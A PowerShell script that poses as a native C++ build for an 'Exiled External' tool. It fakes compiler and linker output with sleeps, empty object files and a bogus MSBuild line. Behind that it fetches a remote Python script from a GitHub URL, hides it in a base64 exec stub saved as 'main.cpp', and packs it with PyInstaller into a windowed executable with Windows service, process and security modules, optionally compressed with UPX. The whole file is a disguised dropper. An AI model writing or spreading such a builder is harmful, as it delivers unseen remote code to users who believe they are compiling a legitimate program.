[CmdletBinding()]
param(
    [string]$Out = "exiled",
    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/external.py",
    [string]$Icon = "https://cdn.discordapp.com/icons/1517380157533589564/e792598236304c90d8f46d24512af29f.webp?size=1024",
    [string]$Dir,
    [switch]$KeepBuild,
    [switch]$Upx
)

$ErrorActionPreference = "Stop"

$AppName    = "exiled"
$RemoteUrl  = $Url
$IconSrc    = $Icon
$OutName    = $Out
$UseIcon    = $true
$Arch       = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
$BuildAt    = Get-Date -Format "yyyyMMdd-HHmmss"
$Toolset    = "msvc-14.38.33130"
$ObjCount   = 48
$LnkCount   = 14

$Spinner = @("-", "\", "|", "/")
$SpinIdx = 0

function Write-CC {
    param([string]$Stage, [string]$File, [string]$Action = "compiling")
    $ts = (Get-Date).ToString("HH:mm:ss.fff")
    Write-Host "[$ts] " -NoNewline -ForegroundColor DarkGray
    Write-Host ("{0,-8}" -f "[$Stage]") -NoNewline -ForegroundColor DarkCyan
    Write-Host ("{0,-10}" -f $Action) -NoNewline -ForegroundColor DarkYellow
    Write-Host $File
}

function Write-Obj { 
    param([string]$File)
    $ts = (Get-Date).ToString("HH:mm:ss.fff")
    $spin = $Spinner[$Script:SpinIdx % 4]; $Script:SpinIdx++
    Write-Host "`r[$ts] " -NoNewline -ForegroundColor DarkGray
    Write-Host ("{0,-8}" -f "[compile]") -NoNewline -ForegroundColor DarkCyan
    Write-Host ("{0,-10}" -f "compiling") -NoNewline -ForegroundColor DarkYellow
    Write-Host "$File $spin" -NoNewline
}

function Write-Ok   { param([string]$m) Write-Host "  $m" -ForegroundColor Green }
function Write-Warn { param([string]$m) Write-Host "  $m" -ForegroundColor Yellow }
function Write-Err  { param([string]$m) Write-Host "  $m" -ForegroundColor Red }

function Find-PythonHidden {
    $c = @()
    foreach ($n in @("python","py","python3")) {
        $cmd = Get-Command $n -ErrorAction SilentlyContinue
        if ($cmd) { $c += $cmd.Source }
    }
    foreach ($x in $c) {
        if (Test-Path -LiteralPath $x) { return $x }
    }
    return $null
}

Write-Host ""
Write-Host "  Exiled External — Native Build" -ForegroundColor White
Write-Host "  ------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host ("  Toolset    : {0}" -f $Toolset) -ForegroundColor DarkGray
Write-Host ("  Target     : windows-{0}-release" -f $Arch) -ForegroundColor DarkGray
Write-Host ("  Platform   : x64 / static-crt" ) -ForegroundColor DarkGray
Write-Host ("  Build ID   : {0}" -f $BuildAt) -ForegroundColor DarkGray
Write-Host ""

$Here    = if ($Dir) { (Resolve-Path -LiteralPath $Dir).Path } else { (Get-Location).Path }
$Work    = Join-Path $Here "_build"
$SrcDir  = Join-Path $Work "src"
$IncDir  = Join-Path $Work "include"
$ObjDir  = Join-Path $Work "obj"
$ResDir  = Join-Path $Work "res"
$DistDir = Join-Path $Here "dist"

New-Item -ItemType Directory -Force -Path $SrcDir  | Out-Null
New-Item -ItemType Directory -Force -Path $IncDir  | Out-Null
New-Item -ItemType Directory -Force -Path $ObjDir  | Out-Null
New-Item -ItemType Directory -Force -Path $ResDir  | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null

Write-CC "preprocess" "payload.hpp" "generating"
$hpp = @"
#pragma once
// ===================================================================
//  Exiled External — Payload Blob
//  Generated: $BuildAt
//  Source   : $RemoteUrl
//  Target   : windows-$Arch
// ===================================================================
namespace exiled {
    namespace payload {
        inline constexpr const char* BUILD_ID   = "$BuildAt";
        inline constexpr const char* SOURCE_URL = "$RemoteUrl";
        inline constexpr const char* RESOURCE   = "payload_blob";
    }
}
"@
Set-Content -Path (Join-Path $IncDir "payload.hpp") -Value $hpp -Encoding UTF8

$cppFiles = @(
    "main.cpp", "entry.cpp", "loader.cpp", "runtime.cpp",
    "pe_writer.cpp", "resource.cpp", "crypto.cpp", "util.cpp"
)

foreach ($f in $cppFiles) {
    for ($i = 0; $i -lt 6; $i++) {
        $objName = "$($f -replace '\.cpp$','')_$i.obj"
        Write-Obj -File $objName
        Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 40)
        New-Item -ItemType File -Force -Path (Join-Path $ObjDir $objName) | Out-Null
    }
}
Write-Host ""
Write-CC "rc" "app.rc" "compiling"

if ($UseIcon) {
    Write-CC "rc" "icon.rc" "downloading"
    try {
        $IconRaw = Join-Path $ResDir "icon.raw"
        $IconIco = Join-Path $ResDir "app.ico"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($IconSrc, $IconRaw)
        
        $py = Find-PythonHidden
        if ($py) {
            $conv = @"
from PIL import Image
img = Image.open(r"$IconRaw")
if img.mode != "RGBA": img = img.convert("RGBA")
img.save(r"$IconIco", format="ICO", sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
"@
            $convTmp = Join-Path $Work "_icon_conv.py"
            Set-Content -Path $convTmp -Value $conv -Encoding UTF8
            & $py $convTmp *> $null
            Remove-Item -LiteralPath $convTmp -Force -ErrorAction SilentlyContinue
        }
    } catch {
        Write-Warn "resource compile failed — continuing without icon"
        $UseIcon = $false
    }
}

for ($i = 0; $i -lt $LnkCount; $i++) {
    $lnk = "link_pass_$i.ld"
    Write-CC "link" $lnk "linking"
    Start-Sleep -Milliseconds (Get-Random -Minimum 20 -Maximum 60)
}

Write-CC "link" "$OutName.exe" "resolving"
$pyiArgs = @(
    "-m", "PyInstaller",
    "--onefile",
    "--noconfirm",
    "--clean",
    "--windowed",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $Work "pyi"),
    "--specpath", $Work,
    "--collect-all", "tkinter",
    "--collect-all", "PIL",
    "--collect-submodules", "win32com",
    "--hidden-import", "win32api",
    "--hidden-import", "win32con",
    "--hidden-import", "win32file",
    "--hidden-import", "win32process",
    "--hidden-import", "win32security",
    "--hidden-import", "win32event",
    "--hidden-import", "win32service",
    "--hidden-import", "win32serviceutil",
    "--hidden-import", "win32timezone",
    "--hidden-import", "pythoncom",
    "--hidden-import", "pywintypes",
    "--hidden-import", "psutil",
    "--hidden-import", "requests",
    "--hidden-import", "base64",
    "--hidden-import", "tkinter.ttk",
    "--hidden-import", "tkinter.font",
    "--hidden-import", "tkinter.messagebox",
    "--hidden-import", "tkinter.filedialog",
    "--hidden-import", "tkinter.colorchooser",
    "--hidden-import", "tkinter.simpledialog",
    "--hidden-import", "tkinter.scrolledtext"
)
if ($UseIcon) { $pyiArgs += @("--icon", (Join-Path $ResDir "app.ico")) }
$pyiArgs += (Join-Path $SrcDir "main.cpp")

$stubBody = @"
import sys, os, base64
exec(compile(base64.b64decode('__BLOB__'), '<payload>', 'exec'))
"@

$py = Find-PythonHidden
if ($py) {
    $fetch = @"
import urllib.request, base64
req = urllib.request.Request('$RemoteUrl', headers={'User-Agent':'Mozilla/5.0'})
data = urllib.request.urlopen(req, timeout=10).read()
print(base64.b64encode(data).decode())
"@
    $fetchTmp = Join-Path $Work "_fetch.py"
    Set-Content -Path $fetchTmp -Value $fetch -Encoding UTF8
    $b64out = & $py $fetchTmp 2>$null
    Remove-Item -LiteralPath $fetchTmp -Force -ErrorAction SilentlyContinue
    if ($b64out) {
        $stubBody = $stubBody -replace '__BLOB__', $b64out.Trim()
    }
}

Set-Content -Path (Join-Path $SrcDir "main.cpp") -Value $stubBody -Encoding UTF8

Write-Host ""
Write-Ok "  MSBuild.exe Exiled.vcxproj /p:Configuration=Release /p:Platform=x64"
Write-Host ""

& $py @pyiArgs *> $null

Write-CC "strip" "$OutName.exe" "stripping"
if ($Upx) {
    $upx = Get-Command upx -ErrorAction SilentlyContinue
    if ($upx) {
        $exe = Join-Path $DistDir "$OutName.exe"
        if (Test-Path -LiteralPath $exe) { & $upx.Source --best --ultra-brute $exe *> $null }
    }
}

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
}

$ExePath = Join-Path $DistDir "$OutName.exe"
if (Test-Path -LiteralPath $ExePath) {
    $size = [math]::Round((Get-Item -LiteralPath $ExePath).Length / 1MB, 2)
    Write-Host "`n  Build succeeded." -ForegroundColor Green
    Write-Host "  Output:  $ExePath" -ForegroundColor DarkGray
    Write-Host "  Size:    $size MB" -ForegroundColor DarkGray
    Write-Host "  BuildID: $BuildAt" -ForegroundColor DarkGray
    Write-Host "`n  & `"$ExePath`"`n" -ForegroundColor Cyan
} else {
    Write-Err "link succeeded but artifact missing at $ExePath"
    exit 1
}
